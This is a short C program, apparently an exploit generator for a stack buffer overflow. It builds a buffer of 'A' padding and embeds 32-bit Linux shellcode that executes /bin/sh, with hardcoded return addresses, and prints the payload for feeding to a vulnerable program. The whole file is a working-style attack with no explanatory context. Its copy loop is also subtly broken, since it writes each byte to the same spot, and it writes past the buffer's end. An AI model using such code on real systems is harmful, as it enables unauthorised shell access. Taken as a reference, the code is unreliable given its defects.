#define POPRET 0x08048467
#define RET 0x08048468
#define bufsize 264
#define chainsize 4

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char shellcode[] = 
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
	;

int main(void) {
	char *buff, *ptr;
	long *adrptr;
	int i;
	buff = malloc(bufsize);
	for (i=0; i<bufsize; i++)
		buff[i] = 'A';
	ptr = buff+bufsize-chainsize;
	adrptr = (long *) ptr;
	for (i=0; i<strlen(shellcode); i++)
		*(ptr) = shellcode[i];
	buff[bufsize] = '\0';
	printf("%s", buff);
}
